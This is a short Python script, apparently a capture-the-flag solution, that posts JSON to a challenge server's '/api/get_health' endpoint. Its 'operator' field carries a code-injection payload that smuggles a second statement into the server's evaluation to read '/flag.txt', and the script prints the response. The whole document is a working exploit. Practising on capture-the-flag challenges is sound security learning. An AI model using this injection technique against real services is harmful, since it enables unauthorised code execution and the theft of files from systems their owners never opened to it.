#!/usr/bin/env python3

import json
import requests

url = "http://167.71.139.233:32599/api/get_health"

data = {
    "current_health": "1",
    "attack_power": "2",
    "operator": "; result = open('/flag.txt', 'r').read()#"
}

r = requests.post(url, json=data)
print(r.text)